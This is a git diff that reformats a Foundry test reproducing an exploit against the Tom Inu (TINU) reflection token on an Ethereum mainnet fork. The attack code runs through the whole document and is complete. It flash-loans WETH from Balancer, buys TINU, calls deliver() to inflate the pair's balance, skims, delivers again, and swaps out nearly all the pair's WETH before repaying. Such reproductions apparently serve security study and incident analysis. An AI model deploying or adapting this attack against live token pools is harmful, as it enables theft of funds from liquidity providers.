@@ -22,7 +22,7 @@ contract TomInuExploit is Test {
     IUniswapV2Pair private constant TINU_WETH = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);
 
     function testHack() external {
-        vm.createSelectFork("https://eth.llamarpc.com", 16489408);
+        vm.createSelectFork("https://eth.llamarpc.com", 16_489_408);
 
         // flashloan WETH from Balancer
         address[] memory tokens = new address[](1);
@@ -41,31 +41,27 @@ contract TomInuExploit is Test {
         bytes memory
     ) external {
         // swapp WETH for TINU to give Pair large fees
-        WETH.approve(address(router), type(uint).max);
-        TINU.approve(address(router), type(uint).max);
+        WETH.approve(address(router), type(uint256).max);
+        TINU.approve(address(router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(TINU);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            104.85 ether, 
-            0, 
-            path, 
-            address(this),
-            type(uint).max
+            104.85 ether, 0, path, address(this), type(uint256).max
         );
-        
+
         console.log("%s TINU in pair before deliver", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract before deliver", TINU.balanceOf(address(this)) / 1e18);
         console.log("-------------Delivering-------------");
-        
-        TINU.deliver(TINU.balanceOf(address(this)));  // give away TINU
+
+        TINU.deliver(TINU.balanceOf(address(this))); // give away TINU
 
         console.log("%s TINU in pair after deliver", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract after deliver", TINU.balanceOf(address(this)) / 1e18);
         console.log("-------------Skimming---------------");
-        
+
         TINU_WETH.skim(address(this));
-        
+
         console.log("%s TINU in pair after skim", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract after skim", TINU.balanceOf(address(this)) / 1e18);
         console.log("-------------Delivering-------------");
@@ -75,13 +71,8 @@ contract TomInuExploit is Test {
         console.log("%s TINU in pair after deliver 2", TINU.balanceOf(address(TINU_WETH)) / 1e18);
         console.log("%s TINU in attack contract after deliver 2", TINU.balanceOf(address(this)) / 1e18);
         // WETH in Pair always = 126
-        
-        TINU_WETH.swap(
-            0,
-            WETH.balanceOf(address(TINU_WETH)) - 0.01 ether,
-            address(this),
-            ""
-        );
+
+        TINU_WETH.swap(0, WETH.balanceOf(address(TINU_WETH)) - 0.01 ether, address(this), "");
 
         // repay
         WETH.transfer(address(balancerVault), amounts[0]);
@@ -131,10 +122,5 @@ interface IUniswapV2Pair {
     function balanceOf(address) external view returns (uint256);
     function skim(address to) external;
     function sync() external;
-    function swap(
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address to,
-        bytes memory data
-    ) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
 }
